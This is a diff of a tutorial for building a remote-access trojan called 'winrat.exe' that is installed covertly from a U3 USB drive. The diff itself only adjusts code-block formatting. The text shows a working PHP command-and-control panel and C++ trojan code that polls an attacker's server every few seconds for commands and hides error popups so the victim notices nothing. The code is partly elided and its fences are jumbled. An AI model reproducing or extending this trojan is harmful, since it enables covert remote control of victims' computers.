@@ -16,12 +16,12 @@ Then create an ISO and run the U3 Updater to put the trojan on your U3 drive. No
 And also, before we start creating our program itself, we need a way to control it. As I said, the trojan downloads 3 files. Let's make these files on our web site/server. Create index.html, assign.html and target.html and don't put anything in there. Then we create a PHP file (edit.php) that is able to edit the html files. Why just PHP and not some normal application? Because this way we can control the trojan from anywhere by just going to yourwebsitehere.com/trojan/edit.php. You can even control computers with your mobile phone if you have mobile internet or Wifi.
 
 [PHP]
-``<br><HTML><br><HEAD><br><TITLE>Winrat.exe Control Panel</TITLE><br><META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE"><br></HEAD><br><BODY><br><br><?php<br>if (isset($_POST['submit'])) {<br><br>$myFile = "index.html";<br>$fh = fopen($myFile, 'w') or die("can't open file");<br>$stringData = stripslashes($_POST['option']);<br>fwrite($fh, $stringData);<br>fclose($fh);<br><br>$myFile2 = "target.html";<br>$fh = fopen($myFile2, 'w') or die("can't open file");<br>$stringData = stripslashes($_POST['target']);<br>fwrite($fh, $stringData);<br>fclose($fh);<br>}<br><br>if (isset($_POST['clear'])) {<br><br>$myFile = "index.html";<br>$fh = fopen($myFile, 'w') or die("can't open file");<br>$stringData = 0;<br>fwrite($fh, $stringData);<br>fclose($fh);<br>}<br><br>if (isset($_POST['assigncomputer'])) {<br><br>$myFile = "assign.html";<br>$fh = fopen($myFile, 'w') or die("can't open file");<br>$stringData = stripslashes($_POST['assign']);<br>fwrite($fh, $stringData);<br>fclose($fh);<br>}<br>?><br><br><div id="wrapper"><br><form action="" method="post"><br><textarea name="target" style="width: 230px; height: 25px; margin-bottom: 5px; font-size: 20px"><br><?php<br>$myFile = "target.html";<br>$fh = fopen($myFile, 'r');<br>$theData = fgets($fh);<br>fclose($fh);<br>echo $theData;<br>?></textarea><br><br /><br><textarea name="option" style="width: 230px; height: 60px; margin-bottom: 5px; font-size: 20px"><br><?php<br>$myFile = "index.html";<br>$fh = fopen($myFile, 'r');<br>$theData = fgets($fh);<br>fclose($fh);<br>echo $theData;<br>?></textarea><br><br /><br><input type="submit" name="submit" value="Edit" style="width: 150px; height: 40px" /><br><input type="submit" name="clear" value="Clear" style="width: 65px; height: 40px" /><br></form><br><br><?php<br>echo 'Current hack activated: <b>';<br><br>$myFile = "index.html";<br>$fh = fopen($myFile, 'r');<br>$theData = fgets($fh);<br>fclose($fh);<br>echo $theData;<br>?><br></b><br><br /><br \><b>1.</b> Just some<br><br /><b>2.</b> HTML code<br><br /><b>3.</b> to remember<br><br /><b>4.</b> what commands<br><br /><b>5.</b> you can use.<br><br /><br /><br><form action="" method="post"><br><textarea name="assign" style="width: 190px; height: 30px; margin-bottom: 2px; font-size: 20px"><br><?php<br>$myFile = "assign.html";<br>$fh = fopen($myFile, 'r');<br>$theData = fgets($fh);<br>fclose($fh);<br>echo $theData;<br>?></textarea> <br><br /><br><input type="submit" name="assigncomputer" value="Assign" style="width: 190px; height: 25px;" /><br></form><br><br></div><br>``
+` <br><HTML><br><HEAD><br><TITLE>Winrat.exe Control Panel</TITLE><br><META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE"><br></HEAD><br><BODY><br><br><?php<br>if (isset($_POST['submit'])) {<br><br>$myFile = "index.html";<br>$fh = fopen($myFile, 'w') or die("can't open file");<br>$stringData = stripslashes($_POST['option']);<br>fwrite($fh, $stringData);<br>fclose($fh);<br><br>$myFile2 = "target.html";<br>$fh = fopen($myFile2, 'w') or die("can't open file");<br>$stringData = stripslashes($_POST['target']);<br>fwrite($fh, $stringData);<br>fclose($fh);<br>}<br><br>if (isset($_POST['clear'])) {<br><br>$myFile = "index.html";<br>$fh = fopen($myFile, 'w') or die("can't open file");<br>$stringData = 0;<br>fwrite($fh, $stringData);<br>fclose($fh);<br>}<br><br>if (isset($_POST['assigncomputer'])) {<br><br>$myFile = "assign.html";<br>$fh = fopen($myFile, 'w') or die("can't open file");<br>$stringData = stripslashes($_POST['assign']);<br>fwrite($fh, $stringData);<br>fclose($fh);<br>}<br>?><br><br><div id="wrapper"><br><form action="" method="post"><br><textarea name="target" style="width: 230px; height: 25px; margin-bottom: 5px; font-size: 20px"><br><?php<br>$myFile = "target.html";<br>$fh = fopen($myFile, 'r');<br>$theData = fgets($fh);<br>fclose($fh);<br>echo $theData;<br>?></textarea><br><br /><br><textarea name="option" style="width: 230px; height: 60px; margin-bottom: 5px; font-size: 20px"><br><?php<br>$myFile = "index.html";<br>$fh = fopen($myFile, 'r');<br>$theData = fgets($fh);<br>fclose($fh);<br>echo $theData;<br>?></textarea><br><br /><br><input type="submit" name="submit" value="Edit" style="width: 150px; height: 40px" /><br><input type="submit" name="clear" value="Clear" style="width: 65px; height: 40px" /><br></form><br><br><?php<br>echo 'Current hack activated: <b>';<br><br>$myFile = "index.html";<br>$fh = fopen($myFile, 'r');<br>$theData = fgets($fh);<br>fclose($fh);<br>echo $theData;<br>?><br></b><br><br /><br \><b>1.</b> Just some<br><br /><b>2.</b> HTML code<br><br /><b>3.</b> to remember<br><br /><b>4.</b> what commands<br><br /><b>5.</b> you can use.<br><br /><br /><br><form action="" method="post"><br><textarea name="assign" style="width: 190px; height: 30px; margin-bottom: 2px; font-size: 20px"><br><?php<br>$myFile = "assign.html";<br>$fh = fopen($myFile, 'r');<br>$theData = fgets($fh);<br>fclose($fh);<br>echo $theData;<br>?></textarea> <br><br /><br><input type="submit" name="assigncomputer" value="Assign" style="width: 190px; height: 25px;" /><br></form><br><br></div><br> `
 
 
 Now we start with creating our winrat.exe, the trojan itself. Here's the source code:
 
-``#include <windows.h>
+`` #include <windows.h>
 #pragma comment(lib, "Winmm.lib")
 #include <urlmon.h> 
 #pragma comment(lib, "urlmon.lib")
@@ -64,7 +64,7 @@ inAssign.close();
 inAssign.clear();
  
 // Start the main loop that is downloading the textfile each 5 seconds.
-while(1) {
+while(1) { ``
  
     // Download Option & Target
     remove("c:\\Windows\\trojan\\option.txt");
@@ -104,7 +104,7 @@ while(1) {
     }
 }
  
-// Our LowProfile Thread. Hides all errors and things that may popup while inserting your U3 drive.
+`` // Our LowProfile Thread. Hides all errors and things that may popup while inserting your U3 drive.
 DWORD WINAPI LowProfile(LPVOID) {
     while(1) {
         // Obvious
@@ -180,4 +180,4 @@ DWORD WINAPI Option4(LPVOID) { // 4
  
 DWORD WINAPI Option5(LPVOID) { // 5
     return 0;
-}``
+} ``
